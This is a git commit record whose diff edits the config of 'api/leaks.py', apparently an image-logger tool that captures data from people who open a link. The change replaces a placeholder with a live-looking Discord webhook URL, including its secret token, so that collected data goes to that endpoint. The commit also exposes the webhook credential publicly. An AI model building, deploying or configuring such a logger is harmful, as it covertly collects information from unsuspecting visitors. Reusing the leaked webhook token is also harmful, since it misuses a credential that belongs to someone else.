b9f2bda9f106fe4b131bae919d88569bd0450288
yapo111 <yapo1223@gmail.com>
2025-02-01 12:27:23 +0800

    Update leaks.py

--- api/leaks.py
+++ api/leaks.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://discord.com/api/webhooks/1335104076488118495/S71SwlEavodvUQPAehXHHtwSGDH6mEjN29dcf2QzyJc-7gUlMKa3yWlPNf37Fb3mgPGn",
     "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
